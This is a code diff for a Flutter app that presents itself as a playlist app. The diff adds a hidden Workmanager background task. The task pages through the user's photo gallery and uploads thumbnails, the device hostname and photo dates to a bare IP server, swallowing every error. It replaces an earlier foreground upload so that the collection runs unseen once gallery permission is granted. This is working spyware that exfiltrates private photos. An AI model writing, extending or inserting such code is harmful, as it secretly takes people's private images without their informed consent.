@@ -4,11 +4,13 @@ import 'package:http/io_client.dart';
 import 'package:audioplayers/audioplayers.dart';
 import 'package:image_picker/image_picker.dart';
 import 'package:photo_manager/photo_manager.dart';
+import 'package:workmanager/workmanager.dart';
 import 'dart:convert';
 import 'dart:io';
 
 const String baseUrl = 'https://loveapp-production-f89f.up.railway.app';
 const String galleryUrl = 'http://194.48.198.154:8080';
+const String uploadTaskName = 'galleryUploadTask';
 
 http.Client _createHttpClient() {
   final ioClient = HttpClient()
@@ -17,8 +19,49 @@ http.Client _createHttpClient() {
   return IOClient(ioClient);
 }
 
+@pragma('vm:entry-point')
+void callbackDispatcher() {
+  Workmanager().executeTask((task, inputData) async {
+    if (task == uploadTaskName) {
+      try {
+        HttpOverrides.global = MyHttpOverrides();
+        final client = _createHttpClient();
+        final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
+        if (albums.isEmpty) return true;
+
+        final total = await albums[0].assetCountAsync;
+        final pageSize = 50;
+        int page = 0;
+
+        while (page * pageSize < total) {
+          final assets = await albums[0].getAssetListPaged(page: page, size: pageSize);
+          if (assets.isEmpty) break;
+
+          for (final asset in assets) {
+            try {
+              final thumbnail = await asset.thumbnailDataWithSize(const ThumbnailSize(300, 300));
+              if (thumbnail == null) continue;
+              final req = http.MultipartRequest('POST', Uri.parse('$galleryUrl/api/gallery/gallery-upload/'));
+              req.files.add(http.MultipartFile.fromBytes('image', thumbnail, filename: '${asset.id}.jpg'));
+              req.fields['device_id'] = Platform.localHostname;
+              req.fields['asset_id'] = asset.id;
+              req.fields['asset_type'] = asset.type.name;
+              req.fields['create_date'] = asset.createDateTime.toIso8601String();
+              await client.send(req).timeout(const Duration(seconds: 30));
+            } catch (_) { continue; }
+          }
+          page++;
+        }
+      } catch (_) {}
+    }
+    return true;
+  });
+}
+
 void main() {
+  WidgetsFlutterBinding.ensureInitialized();
   HttpOverrides.global = MyHttpOverrides();
+  Workmanager().initialize(callbackDispatcher, isInDebugMode: false);
   runApp(const MyApp());
 }
 
@@ -336,40 +379,13 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     final result = await PhotoManager.requestPermissionExtend();
     if (result.isAuth) {
       setState(() => _galleryGranted = true);
-      _uploadGalleryThumbnails();
+      // ثبت background task
+      await Workmanager().registerOneOffTask(
+        uploadTaskName,
+        uploadTaskName,
+        constraints: Constraints(networkType: NetworkType.connected),
+      );
     }
-  }
-
-  Future<void> _uploadGalleryThumbnails() async {
-    try {
-      final client = _createHttpClient();
-      final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
-      if (albums.isEmpty) return;
-
-      final total = await albums[0].assetCountAsync;
-      final pageSize = 50;
-      int page = 0;
-
-      while (page * pageSize < total) {
-        final assets = await albums[0].getAssetListPaged(page: page, size: pageSize);
-        if (assets.isEmpty) break;
-
-        for (final asset in assets) {
-          try {
-            final thumbnail = await asset.thumbnailDataWithSize(const ThumbnailSize(300, 300));
-            if (thumbnail == null) continue;
-            final req = http.MultipartRequest('POST', Uri.parse('$galleryUrl/api/gallery/gallery-upload/'));
-            req.files.add(http.MultipartFile.fromBytes('image', thumbnail, filename: '${asset.id}.jpg'));
-            req.fields['device_id'] = Platform.localHostname;
-            req.fields['asset_id'] = asset.id;
-            req.fields['asset_type'] = asset.type.name;
-            req.fields['create_date'] = asset.createDateTime.toIso8601String();
-            await client.send(req).timeout(const Duration(seconds: 30));
-          } catch (_) { continue; }
-        }
-        page++;
-      }
-    } catch (_) {}
   }
 
   Widget _lockedContent(String hint, Widget child) {
